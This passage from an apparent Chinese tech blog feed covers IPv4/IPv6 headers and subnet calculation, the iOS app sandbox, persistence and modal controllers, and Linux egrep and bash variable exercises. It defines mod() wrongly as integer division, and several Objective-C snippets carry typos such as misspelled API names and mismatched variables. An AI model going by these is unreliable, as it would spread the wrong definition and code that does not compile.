                <img src="http://omunhj2f1.bkt.clouddn.com/77F5D3A7D0E0D78B5EF4A40E97DD2E85.png" alt="77F5D3A7D0E0D78B5EF4A40E97DD2E85.png" title="" class="">
                <p>77F5D3A7D0E0D78B5EF4A40E97DD2E85.png</p>
            </figure>
<p>没错上面这张图就是IPv4首部中所包含的信息，下面就来详细的解释其中每个部分的意义,emmm，太长了，还是不想说了，自己看<a href="http://blog.csdn.net/ce123_zhouwei/article/details/17453033" target="_blank" rel="external">博客</a>。</p>
<h3 id="IPv6-1"><a href="#IPv6-1" class="headerlink" title="IPv6"></a>IPv6</h3><p>至于IPv6的首部相比于IPv4已经发生了巨大变化</p>
<p>IPv6中为了减轻路由器的负担，省略了首部校验和字段。因此路由器不需要再计算首部校验和，从而提高了包的转发效率。</p>
<p>此外，分片处理所使用的识别码称为可选项为了让64位计算机处理起来更方便，IPv6首部和可选项都由8字节构成。</p>
<p>虽然IPv6首部长度固定，无法将可选项加入其中，取而代之的是通过扩展首部对功能进行有效的扩展。</p>
<p>IPv4以及IPv6都可以参考<a href="http://blog.csdn.net/frank_jb/article/details/45093615" target="_blank" rel="external">博客</a></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="子网掩码的算法"><a href="#子网掩码的算法" class="headerlink" title="子网掩码的算法"></a>子网掩码的算法</h3><p>古语云：授人以鱼不如授人以渔。<br>现在用池塘和鱼的例子来做类比，无论鱼儿怎么变化，同学们都可以快速、高效地捉住它们。</p>
<p>公式：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1.m.1.1/n 其中 0≤m≤255，8≤n≤16，试问小鱼甲在哪个小池子？这个小池子有多少只小鱼？</div><div class="line"></div><div class="line">x=16-n，这个小池子有 2^x 只小鱼</div><div class="line"></div><div class="line">y=n-8，一共有 2^y 个小池子</div><div class="line"></div><div class="line">z= mod（m,2^x）* 2^x，小鱼位于编号为 1.z/n 的小池子里。</div><div class="line"></div><div class="line">#注：mod()为模运算，比如 mod(129,16)=8，就是 129 除以 16 所得的整数，即为模。</div></pre></td></tr></table></figure>
<p>例子一：小鱼甲的IP= 1.233.1.1/11<br>m = 233，n =11<br>x=16-11=5，这个小池子有 2^5= 32 只小鱼<br>y=11-8=3，一共有 2^3=8 个小池子<br>z= mod（233,32）<em> 32= 7</em>32= 224，小鱼甲位于编号为 1.224/11 的小池子里，由于传统习惯，将余下的两个字节补零为 1.224.0.0/11。</p>
<p>故事中的小鱼，换成主机，故事中的池子，换成网段，就是网络掩码与网段的故事。<br>养鱼场有 32 位养鱼人，每个养鱼人养了 256 条鱼，对于养鱼场的营业者来说，只关心养鱼人鱼塘的编号即可：<br>1.1.0.0/24 老张<br>1.1.1.0/24 老王<br>1.1.2.0/24 老李<br>1.1.3.0/24 老黄<br>……<br>1.1.31.0/24 老某<br>至于老王、老张将鱼塘划分成若干鱼池，虹桥养鱼场并不关心，那不过是老王他们用来编号的方法，所以虹桥养鱼场只需要以上 32 行就可以区分彼此，而不需要更加明晰化区分 1.1.1.64/26 、1.1.1.128/26 是谁的。</p>
<p>这个具体可以参考车小胖的—<a href="https://read.douban.com/reader/ebook/33499415/" target="_blank" rel="external">计算机是如何聊天的</a></p>
]]></content>
      
        <categories>
            
            <category> 路由控制表 公私IP CIDR与VLSM </category>
            
        </categories>
        
        
        <tags>
            
            <tag> TCP/IP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS沙盒与模态]]></title>
      <url>/2017/08/31/iOS%E6%B2%99%E7%9B%92%E4%B8%8E%E6%A8%A1%E6%80%81/</url>
      <content type="html"><![CDATA[<p>ios为何安全？数据是如何存储？控制器在频繁地切换间生命周期是怎样的？欢迎观看今日说ios~<br><a id="more"></a></p>
<h1 id="iOS沙盒与模态"><a href="#iOS沙盒与模态" class="headerlink" title="iOS沙盒与模态"></a>iOS沙盒与模态</h1><h2 id="iOS应用存储数据常用方式"><a href="#iOS应用存储数据常用方式" class="headerlink" title="iOS应用存储数据常用方式"></a>iOS应用存储数据常用方式</h2><ul>
<li><p>XML属性列表（plist）归档</p>
</li>
<li><p>Preference（偏好设置）</p>
<p>本质还是通过plist文件存储数据，但是使用更简单（不需要关注文件，文件夹路径和名称）</p>
</li>
<li><p>NSKeyedArchiver归档（NSCoding）</p>
<p>把任何对象，直接保存为文件的方式</p>
</li>
<li><p>SQLite3</p>
<p>当非常大的数据存储时使用</p>
</li>
<li><p>Core Data</p>
<p>对SQLite3的封装</p>
</li>
</ul>
<h2 id="应用沙盒结构分析"><a href="#应用沙盒结构分析" class="headerlink" title="应用沙盒结构分析"></a>应用沙盒结构分析</h2><p>每个ios应用都有自己的应用沙盒，沙盒机制规定每个应用都只能访问当前沙盒目录下面的文件（也有例外，比如在用户授权情况下访问通讯录，相册等），这个规则展示了iOS系统的封闭性。在开发中常常需要数据存储的功能，比如存取文件，归档解档等。</p>
<h3 id="沙盒目录结构"><a href="#沙盒目录结构" class="headerlink" title="沙盒目录结构"></a>沙盒目录结构</h3><ol>
<li><p>Documents(文档数据)<br>保存应用运行时生成的需要持久化的数据，iTunes同步设备时会备份该目录，如游戏进度存档等。</p>
</li>
<li><p>Library(资源库)<br>Library下默认有两个文件夹，Caches文件夹和tmp文件夹</p>
<blockquote>
<p>a. Caches(缓存)<br>保存应用运行时生成的需要持久化的数据，iTunes同步设备时不会备份该目录。该文件夹一般用于存储体积大、不需要备份的非重要数据</p>
<p>b. Preferences(偏好设置)<br>保存应用的所有偏好设置，ios的Settings(设置)，应用会在该目录中查找应用的设置信息。iTunes同步设备时会备份该目录，通常存储一些基本的软件配置信息，比如记住密码，自动登录等。</p>
</blockquote>
</li>
<li><p>tmp(临时文件目录)<br>保存应用运行时所需的临时数据，使用完毕后再将相应的文件从该目录删除。应用没有运行时，系统也可能会清除该目录下的文件。iTunes同步设备时不会备份该目录。iPhone在重启时，会丢弃所有的tmp文件</p>
</li>
</ol>
<p>我们平时操作的数据主要使用Documents目录</p>
<h2 id="打开应用沙盒"><a href="#打开应用沙盒" class="headerlink" title="打开应用沙盒"></a>打开应用沙盒</h2><p>应用沙盒是在MAC的资源库（Library目录下），资源库文件夹默认是隐藏的,要显示隐藏的资源库才能查看iPhone模拟器的应用沙盒。</p>
<p>1.显示隐藏的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#显示Mac隐藏的文件</div><div class="line">defaults write com.apple.finder AppleShowAllFiles YES</div><div class="line">#隐藏Mac隐藏文件</div><div class="line">defaults write com.apple.finder AppleShowAllFiles NO</div><div class="line">#输入以上的命令之后，重新启动finder即可</div></pre></td></tr></table></figure>
<p>2.安装<strong>SimPholders</strong>应用程序，该应用可以轻松查看每一个应用程序的应用沙盒</p>
<h3 id="沙盒机制的好处"><a href="#沙盒机制的好处" class="headerlink" title="沙盒机制的好处"></a>沙盒机制的好处</h3><p>1.安全：别的App无法修改你的程序或数据</p>
<p>2.保护隐私：别的App无法读取你的程序和数据</p>
<p>3.方便删除：因为一个App中所有的内容都在自己的沙盒中，所以删除沙盒就可以彻底删除程序</p>
<h2 id="获取路径"><a href="#获取路径" class="headerlink" title="获取路径"></a>获取路径</h2><h3 id="1-沙盒路径"><a href="#1-沙盒路径" class="headerlink" title="1.沙盒路径"></a>1.沙盒路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">NSString *path = NSHomeDirectory();</div><div class="line">NSLog(@&quot;%@&quot;, path);</div><div class="line">NSLog(@&quot;%@&quot;, [NSBundle mainBundle].bundlePath);</div></pre></td></tr></table></figure>
<h3 id="2-Documents路径"><a href="#2-Documents路径" class="headerlink" title="2.Documents路径"></a>2.Documents路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">// NSDocumentDirectory：目标文件夹</div><div class="line">   // NSUserDomainMask：作用域</div><div class="line">   // YES：是否展开波浪线</div><div class="line">   // 在iOS中，只有一个目录跟传入的参数匹配，所以这个集合里面只有一个元素，用firstObject取第一个元素</div><div class="line">   NSString *documentsPath = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES).firstObject;</div><div class="line"></div><div class="line">   NSLog(@&quot;%@&quot;,documentsPath);</div></pre></td></tr></table></figure>
<h3 id="3-Tmp路径"><a href="#3-Tmp路径" class="headerlink" title="3.Tmp路径"></a>3.Tmp路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">NSString *tmpPath = NSTemporaryDirectory();</div><div class="line"></div><div class="line">NSLog(@&quot;%@&quot;,tmpPath);  </div><div class="line">//或者使用沙盒根目录进行拼接</div><div class="line">NSString *homePath = NSHomeDirectory();</div><div class="line"></div><div class="line">// 不建议采用，因为新版本的操作系统可能会修改目录名</div><div class="line">NSString *tmpPath = [homePath stringByAppendingPathComponent:@&quot;tmp&quot;];</div><div class="line"></div><div class="line">NSLog(@&quot;%@&quot;,tmpPath);</div></pre></td></tr></table></figure>
<h3 id="4-Library路径"><a href="#4-Library路径" class="headerlink" title="4.Library路径"></a>4.Library路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//Caches路径</div><div class="line">NSString *filePath = NSSearchPathForDirectoriesInDomains(NSCachesDirectory,    </div><div class="line">                         NSUserDomainMask, YES).firstObject;</div><div class="line">//Preference路径                         </div><div class="line">NSString *filePath = NSSearchPathForDirectoriesInDomains</div><div class="line">  (NSPreferencePanesDirectory, NSUserDomainMask, YES).firstObject;</div></pre></td></tr></table></figure>
<h3 id="5-应用程序包路径"><a href="#5-应用程序包路径" class="headerlink" title="5.应用程序包路径"></a>5.应用程序包路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> NSString *imagePath = [NSBundle mainBundle].resourcePath;</div><div class="line">//获取目录下一个图片的路径</div><div class="line"> NSString *imagePath = [[NSBundle mainBundle]pathForResource:@&quot;apple&quot; ofType:@&quot;png&quot;];</div></pre></td></tr></table></figure>
<h2 id="plist文件存储"><a href="#plist文件存储" class="headerlink" title="plist文件存储"></a>plist文件存储</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">NSArray *names = [NSArray arrayWithObjects:@&quot;1&quot;, @&quot;2&quot;, @&quot;3&quot;, nil];</div><div class="line"></div><div class="line">NSString *path = [NSSearchPathForDirectoryInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];</div><div class="line"></div><div class="line">NSString *filePath = [path stringByAppendingPathComponent:@&quot;names.plist&quot;];</div><div class="line">//参数二是是否允许原子型写入</div><div class="line">[names writeToFile:filePath atomically:YES];</div><div class="line"></div><div class="line">//偏好设置存储，单例对象</div><div class="line">NSUserDefaults *userDefaults= [NSUserDefaults standardUserDefaults];</div><div class="line">//设置数据</div><div class="line">[userDefaults setBool:YES forKey:@&quot;isTrue&quot;];</div><div class="line">[userDefaults setObject:@&quot;124&quot; forKey:@&quot;number&quot;];</div><div class="line">//立即存储</div><div class="line">[userDefaults synchronize];</div></pre></td></tr></table></figure>
<h2 id="归档和反归档"><a href="#归档和反归档" class="headerlink" title="归档和反归档"></a>归档和反归档</h2><p>通过plist可以保存数据，但是无法直接将对象保存到一个文件当中。比如自己创建的一个Person对象就没有writeToFile方法。但是我们可以通过归档的方式将任何遵守NSCoding协议的对象存储到文件中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//首先在这个类中要遵从NSCoding协议，并且在这个类中实现代理方法</div><div class="line">- (void)encodeWithCoder:(NSCoder *)aCoder&#123;</div><div class="line">    [aCoder encodeObject:self.name forKey:@&quot;name&quot;];</div><div class="line">  	[aCoder encodeObject:self.phoneNumber forKey:@&quot;phoneNumber&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">Person *person = [[Person alloc] init];</div><div class="line">person.name = @&quot;tom&quot;;</div><div class="line">person.phoneNumber= @&quot;10010&quot;;</div><div class="line">NSString *path = [NSSearchPathForDirectoryInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];</div><div class="line">NSString *filePath = [path stringByAppendingPathComponent:@&quot;contact.plist&quot;];</div><div class="line">//通过归档的方式存储</div><div class="line">[NSKeyedArchiver archiveRootObject:person toFile:fileName];</div></pre></td></tr></table></figure>
<p>同时我们也可以通过反归档的方式，将文件重新还原成对象，同样也要遵从NSCoding协议：ee</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//实现反归档的代理方法</div><div class="line">- (instancetype)initWithCoder:(NSCoder *)aDecoder&#123;</div><div class="line">    if(self = [super init])&#123;</div><div class="line">        self.name = [aDecoder decodeObjectForKey:@&quot;name&quot;];</div><div class="line">      	self.phoneNumber = [aDecoder decodeObjectForKey:@&quot;phoneNumber&quot;];</div><div class="line">    &#125;</div><div class="line">  return self;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">NSString *path = [NSSearchPathForDirectoryInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];</div><div class="line">NSString *filePath = [path stringByAppendingPathComponent:@&quot;contact.plist&quot;];</div><div class="line">//进行反归档</div><div class="line">Person *person = [NSKeyedUnarchiver unarchiveObjectWithFile:filename];</div></pre></td></tr></table></figure>
<h2 id="UITabBarController"><a href="#UITabBarController" class="headerlink" title="UITabBarController"></a>UITabBarController</h2><h3 id="纯代码创建方式"><a href="#纯代码创建方式" class="headerlink" title="纯代码创建方式"></a>纯代码创建方式</h3><p>和导航控制器相对的，这个相当于是底部的导航控制器，其创建方式和导航控制器也非常的类似，记得要把info.plist中的那个”Main”删掉啊：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">self.window= [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];</div><div class="line"></div><div class="line">UITabBarController *tabBarVc = [UITabBarViewController alloc] init];</div><div class="line"></div><div class="line">tabBarVc.view.backgroundColor = [UIColor redColor];</div><div class="line"></div><div class="line">PController *pVc = [[PController alloc] init];</div><div class="line"></div><div class="line">[tabBarVc addChildViewController: pVc];</div><div class="line"></div><div class="line">self.window.rootViewController = tabBarVc;</div><div class="line"></div><div class="line">[self.window makeKeyAndVisible];</div><div class="line">//添加子控制器的时候还可以像下面这样一起添加</div><div class="line">tabBarVc.viewControllers = @[pVc, pVc1];</div></pre></td></tr></table></figure>
<p>那么如果要给它加上诸如联系人、空间之类的标题图片要怎么做呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pVc.tabBarItem.title = @&quot;Peterpan&quot;;</div><div class="line">pVc.tabBarItem.image = [UIImage imageNamed:@&quot;peterpan&quot;];</div></pre></td></tr></table></figure>
<p>然后就会形成下面这样的效果(不要吐槽我的画质，开心就好～)</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-29%20%E4%B8%8B%E5%8D%8811.23.23.png" alt="屏幕快照 2017-08-29 下午11.23.23.png" title="" class="">
                <p>屏幕快照 2017-08-29 下午11.23.23.png</p>
            </figure>
<p>这个时候发现图片居然是蓝色的？？？这是因为high_lighted状态系统默认会渲染成蓝色，如果要修改的话可以这样写代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">//修改图片的渲染模式</div><div class="line">selectImage = [selectImage imageWithRenderingMode:UIImageRenderingModeAlwaysOriginal];</div><div class="line">pVc.tabBarItem.selectedImage = selectImage;</div></pre></td></tr></table></figure>
<h3 id="通过Storyboard加载tabBarController"><a href="#通过Storyboard加载tabBarController" class="headerlink" title="通过Storyboard加载tabBarController"></a>通过Storyboard加载tabBarController</h3><p>如果是从控件栏中拖入一个tabBarController，会一次性附加两个控制器，同时别忘了给tabBarController加上箭头，因为storyboard默认加载箭头指向的控制器。同时在附加控制器连线的时候，不同于导航控制器的show，而是点击之前的一条连线，有一个viewControllers，将之连到要加入的控制器即可。</p>
<p>接下来说一下UITabBarButton中的一些属性，可以参考导航控制器的。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/891D21A5B819BE4CF04B2C9C607C0950.jpg" alt="891D21A5B819BE4CF04B2C9C607C0950.jpg" title="" class="">
                <p>891D21A5B819BE4CF04B2C9C607C0950.jpg</p>
            </figure>
<p>这个地方要说一点，就是和导航控制器不同的是，tabBarController的子控制器在进行切换的时候<code>不会被销毁</code>，导航控制器在切换子控制器的时候会将该子控制器上面的控制器弹出并销毁。</p>
<h3 id="App主流框架结构"><a href="#App主流框架结构" class="headerlink" title="App主流框架结构"></a>App主流框架结构</h3><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/FCEFA1AAE0F65D78D5706A12306E39A6.jpg" alt="FCEFA1AAE0F65D78D5706A12306E39A6.jpg" title="" class="">
                <p>FCEFA1AAE0F65D78D5706A12306E39A6.jpg</p>
            </figure>
<p>主流框架就是通过tabBarController配合导航控制器来使用，qq也是这样做的</p>
<p>首先加载一个tabBarController，然后根据用户的点击选择跳转不同的导航控制器，导航控制器中再分别设置视图控制器等，如果动态那一栏可以使用静态单元格。</p>
<p>其中有一些逻辑是需要我们注意的：</p>
<p>1.在我们通过底部的按钮加载导航控制器之后，导航控制器内push的时候，tabBar需要隐藏，点击需要隐藏的控制器，右侧栏的layout那里有一个选项，勾选即可：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/30299C863BC1649EE7158C41B0B2E559.jpg" alt="30299C863BC1649EE7158C41B0B2E559.jpg" title="" class="">
                <p>30299C863BC1649EE7158C41B0B2E559.jpg</p>
            </figure>
<p>2.如果是静态单元格的话，可以直接选中tableViewCell来进行拖线的方式进行跳转</p>
<h3 id="模态出控制器"><a href="#模态出控制器" class="headerlink" title="模态出控制器"></a>模态出控制器</h3><p>模态也是一种切换控制器显示的方法（之前是通过push和pop），任何控制器都可以通过模态来显示。</p>
<p>模态的默认效果是新控制器从屏幕底下往上钻，直到覆盖原来的控制器为止</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#import &quot;ViewController.h&quot;</div><div class="line">#import &quot;NewViewController.h&quot;</div><div class="line"></div><div class="line">@interface ViewController()</div><div class="line">  </div><div class="line">@end</div><div class="line">  </div><div class="line">@implementation ViewController</div><div class="line">  </div><div class="line">- (IBAction)btnClick:(id)sender&#123;</div><div class="line">    NewViewController *new = [[NewViewController alloc] init];</div><div class="line">  </div><div class="line">	//设置代理</div><div class="line">  	new.delegate = self;</div><div class="line">  	</div><div class="line">  	[self presentViewController:new animated:YES completion:nil];</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<p>如果是推出控制器的时候，要是用代理的模式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">//.h文件中设置代理</div><div class="line">@protocol NewViewControllerDelegate &lt;NSObject&gt;</div><div class="line"></div><div class="line">- (void)newControllerDismissBtnClick:(NewViewController *)newVc;</div><div class="line">  </div><div class="line">@end</div><div class="line">- (IBAction)dismissClick:(id)sender&#123;</div><div class="line">    if([self.delegate respondsToSelector:@selector(newViewControllerDismissBtnClick)])&#123;</div><div class="line">        [self.delegate newViewControllerDismissBtnClick:self];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">//在viewController中实现方法</div><div class="line">- (void)newControllerDismissBtnClick:(NewViewController *)newVc&#123;</div><div class="line">  //这个方法首先会判断自己是不是被present出来的，如果是的，就销毁</div><div class="line">    [self dismissViewControllerAnimated:YES completion:nil];</div><div class="line">&#125;</div><div class="line">//但是这里一般不会用代理hhh，是不是觉得被骗了，直接dismiss就好了</div></pre></td></tr></table></figure>
<p>但是在控制器中间放一个按钮始终感觉非常的奇怪，所以我们一般在使用的时候可以把要显示的控制器包装在一个导航控制器中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- (IBAction)btnClick:(id)sender&#123;</div><div class="line">    NewViewController *new = [[NewViewController alloc] init];</div><div class="line"></div><div class="line">  	UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController: new];</div><div class="line">  	//创建导航栏最左侧按钮</div><div class="line">  	new.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemCancel target:self action:@selector(dismissClick)];</div><div class="line">  </div><div class="line">  	[self presentViewController:nav animated:YES completion:nil];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>想用storyboard来实现当然也是可以的，只不过把之前的show换成Present-Modaily，转场效果可以自己设置哦～，个人觉得旋转的比较炫酷一点。</p>
]]></content>
      
        <categories>
            
            <category> 沙盒结构 数据持久化 模态控制器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux运维学习Day6]]></title>
      <url>/2017/08/28/Linux%E8%BF%90%E7%BB%B4%E5%AD%A6%E4%B9%A0Day6/</url>
      <content type="html"><![CDATA[<p>这里我们会学习更方便的扩展正则表达式并更加深入的理解配置文件的加载流程</p>
<a id="more"></a>
<h1 id="Linux运维学习Day6"><a href="#Linux运维学习Day6" class="headerlink" title="Linux运维学习Day6"></a>Linux运维学习Day6</h1><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>我们在学习的时候除了在本机上使用虚拟机的时候,也可以通过购买虚拟服务器（VPS），比较著名的有Linode…这些我们通过ssh访问并使用的服务器其实是在同一个服务器上的虚拟机。</p>
<p>这些服务器有多个处理器，每个处理器是多核的，就可以分出多个虚拟机去售卖，但是如果同一个服务器的所有购买者同时上线，祈祷不要出现这种情况吧，会比较卡，如果因为他人的I/O操作导致自己的进程响应缓慢，换个服务器吧骚年～。</p>
<h2 id="egrep和扩展正则表达式"><a href="#egrep和扩展正则表达式" class="headerlink" title="egrep和扩展正则表达式"></a>egrep和扩展正则表达式</h2><p>egrep就是使用的扩展正则表达式，他的使用也可以描述成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep -E</div></pre></td></tr></table></figure>
<p>其中扩展正则表达式和传统的正则表达式有些许的不同</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/C0211EED7800B5EADC37A0F1E75CB7F8.png" alt="C0211EED7800B5EADC37A0F1E75CB7F8.png" title="" class="">
                <p>C0211EED7800B5EADC37A0F1E75CB7F8.png</p>
            </figure>
<p>练习：</p>
<p>1.显示当前root、centos或user1用户的默认shell和UID</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep -E &apos;^(root|centos|user1)\&gt;&apos; /etc/passwd | cut -d: -f1,3,7</div></pre></td></tr></table></figure>
<p>2.找出/etc/rc.d/init.d/functions文件中某个单词后面跟一个小括号的行:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep -E -o <span class="string">'^[[:alpha:]]+\(\)'</span> /etc/rc.d/init.d/<span class="built_in">functions</span></div></pre></td></tr></table></figure>
<p>3.使用echo输出一绝对路径，使用egrep取出其基名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo /etc/passwd | grep -E -o &apos;[^/]+/?$&apos; | cut -d&apos;/&apos; -f1</div></pre></td></tr></table></figure>
<p>4.找出ifconfig命令结果中1-255中的数值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ifconfig | grep -E -o &quot;\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;&quot;</div></pre></td></tr></table></figure>
<p>5.找出ifconfig命令结果中的ip地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ifconfig | grep -E -o &quot;(\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;\.)(\&lt;([0-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;\.)&#123;2&#125;\&lt;([0-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;&quot;</div></pre></td></tr></table></figure>
<h2 id="bash的基础特性"><a href="#bash的基础特性" class="headerlink" title="bash的基础特性"></a>bash的基础特性</h2><p>bash中变量的种类：</p>
<ul>
<li>本地变量：生效范围为当前shell进程，对当前shell之外的其它shell进程都无效</li>
<li>环境变量：生效范围为当前shell进程及其子进程</li>
<li>局部变量：生效范围为当前shell进程中某代码片段（通常指函数）</li>
<li>位置变量：$1,$2…来表示，用于让脚本在脚本代码中调用命令行传递给他的参数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#! /bin/bash</div><div class="line">echo $1</div><div class="line">echo $2</div><div class="line">#执行这个shell脚本之后会根据传入的参数进行输出</div></pre></td></tr></table></figure>
<ul>
<li>特殊变量：$0、$?、$#、$@、$*</li>
</ul>
<p>1.本地变量：</p>
<blockquote>
<p>变量赋值：name=’value’</p>
<p>可以使用引用：</p>
<p>1.可以直接是字符串：name=”value”</p>
<p>2.变量引用：name=”$value”</p>
<p>3.命令引用：name=$(COMMAND)</p>
<p>变量引用：$name、${name}，后者在有混淆时将变量与混淆字符分隔开</p>
<p>“ “:弱引用,其中的变量引用会被替换成变量值</p>
<p>‘ ‘:强引用,其中的变量引用不会被替换成变量值，而是保持原字符串</p>
</blockquote>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-15%20%E4%B8%8B%E5%8D%884.22.14.png" alt="屏幕快照 2017-08-15 下午4.22.14.png" title="" class="">
                <p>屏幕快照 2017-08-15 下午4.22.14.png</p>
            </figure>
<blockquote>
<p>显示、销毁已定义的所有变量</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">set </div><div class="line">unset name</div></pre></td></tr></table></figure>
<p>2.环境变量</p>
<blockquote>
<p>变量声明，赋值：</p>
</blockquote>
